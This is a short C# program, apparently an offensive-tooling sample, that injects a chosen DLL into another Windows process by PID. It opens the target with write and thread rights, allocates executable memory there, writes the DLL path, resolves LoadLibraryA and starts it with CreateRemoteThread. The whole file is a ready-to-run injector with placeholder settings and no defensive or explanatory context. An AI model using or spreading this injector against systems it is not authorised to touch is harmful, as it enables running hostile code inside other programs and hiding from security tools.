using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.Memory;
using Windows.Win32.System.Threading;

[SupportedOSPlatform("windows5.1.6200")]
public class Program
{
    // CHANGE THESE
    const int PID = 0;
    const string dllPath = "C:\\path\\to\\custom.dll";

    public static void Main()
    {
        unsafe
        {
            Console.WriteLine("[*] Writing DLL path to target process...");
            var processHandle = PInvoke.OpenProcess(PROCESS_ACCESS_RIGHTS.PROCESS_CREATE_THREAD | PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION | PROCESS_ACCESS_RIGHTS.PROCESS_VM_WRITE | PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ | PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_INFORMATION, false, PID);
            var dllPathAddress = PInvoke.VirtualAllocEx(processHandle, null, (nuint)(dllPath.Length + 1), VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE | VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT, PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
            fixed (byte* dllPathBytes = Encoding.Default.GetBytes(dllPath))
            {
                _ = PInvoke.WriteProcessMemory(processHandle, dllPathAddress, dllPathBytes, (nuint)(dllPath.Length + 1), null);
            }

            Console.WriteLine("[*] Resolving LoadLibraryA address...");
            HMODULE moduleHandle;
            fixed (char* moduleName = "kernel32.dll")
            {
                moduleHandle = PInvoke.GetModuleHandle((PCWSTR)moduleName);
            }
            
            FARPROC procAddress;
            fixed (byte* procName = Encoding.Default.GetBytes("LoadLibraryA"))
            {
                procAddress = PInvoke.GetProcAddress(moduleHandle, (PCSTR)procName);
            }

            Console.WriteLine("[*] Forcing LoadLibraryA call...");
            _ = PInvoke.CreateRemoteThread(processHandle, null, 0, Marshal.GetDelegateForFunctionPointer<LPTHREAD_START_ROUTINE>(procAddress.Value), dllPathAddress, 0, null);
        }
    }
}
